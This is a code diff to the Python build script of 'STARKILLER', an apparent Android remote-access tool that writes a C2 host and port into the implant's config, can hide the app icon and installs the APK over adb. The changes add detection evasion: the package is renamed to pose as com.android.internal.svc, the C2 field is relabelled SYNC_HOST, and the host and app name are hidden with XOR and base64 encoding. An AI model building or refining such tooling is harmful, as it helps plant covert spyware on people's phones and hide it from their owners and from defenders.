@@ -16,12 +16,13 @@ import subprocess
 import shutil
 import argparse
 import re
+import base64
 
 PROJECT = os.path.dirname(os.path.abspath(__file__))
 CLIENT_DIR = os.path.join(PROJECT, "client")
 SDK_DIR = os.path.join(PROJECT, "android-sdk")
 PAYLOADS_DIR = os.path.join(PROJECT, "payloads")
-CONFIG_FILE = os.path.join(CLIENT_DIR, "app", "src", "main", "kotlin", "com", "starkiller", "agent", "Config.kt")
+CONFIG_FILE = os.path.join(CLIENT_DIR, "app", "src", "main", "kotlin", "com", "android", "internal", "svc", "Config.kt")
 
 G = "\033[92m"
 R = "\033[91m"
@@ -31,22 +32,32 @@ W = "\033[97m"
 X = "\033[0m"
 
 
+def xor_encrypt(plaintext, key=0x5A):
+    out = []
+    for i, ch in enumerate(plaintext):
+        out.append(ord(ch) ^ (key + i % 7))
+    return base64.b64encode(bytes(out)).decode()
+
+
 def inject_config(ip, port, app_name, hide_icon):
-    config = f'''package com.starkiller.agent
+    enc_host = xor_encrypt(ip)
+    enc_name = xor_encrypt(app_name)
+    config = f'''package com.android.internal.svc
 
 object Config {{
-    const val C2_HOST = "{ip}"
-    const val C2_PORT = {port}
-    const val APP_NAME = "{app_name}"
+    val SYNC_HOST: String get() = Crypt.d("{enc_host}")
+    const val SYNC_PORT = {port}
+    const val RECONNECT_BASE_MS = 5000L
+    const val RECONNECT_MAX_MS = 300000L
+    const val HEARTBEAT_INTERVAL_MS = 30000L
+    val APP_NAME: String get() = Crypt.d("{enc_name}")
     const val HIDE_ICON = {str(hide_icon).lower()}
-    const val RECONNECT_DELAY = 10_000L
-    const val HEARTBEAT_INTERVAL = 30_000L
 }}
 '''
     os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
     with open(CONFIG_FILE, "w") as f:
         f.write(config)
-    print(f"  {G}[+]{X} Config injected: {ip}:{port}")
+    print(f"  {G}[+]{X} Config injected: {ip}:{port} (encrypted)")
     if hide_icon:
         print(f"  {A}[~]{X} App icon will be hidden after first launch")
 
@@ -140,11 +151,11 @@ def main():
 
     print(f"""
 {W}  STARKILLER BUILD{X}
-{D}  ──────────────────────────────{X}
+{D}  ------------------------------{X}
 {D}  C2:{X}    {W}{args.ip}:{args.port}{X}
 {D}  Name:{X}  {W}{args.name}{X}
 {D}  Mode:{X}  {W}{'release' if args.release else 'debug'}{X}
-{D}  ──────────────────────────────{X}
+{D}  ------------------------------{X}
 """)
 
     inject_config(args.ip, args.port, args.name, args.hide_icon)
@@ -156,7 +167,7 @@ def main():
     if args.install:
         install_apk(apk)
 
-    print(f"\n  {D}{'─'*40}{X}")
+    print(f"\n  {D}{'-'*40}{X}")
     print(f"  {G}[+] Build complete.{X}")
     if not args.install:
         print(f"  {D}Install: adb install -r {apk}{X}")
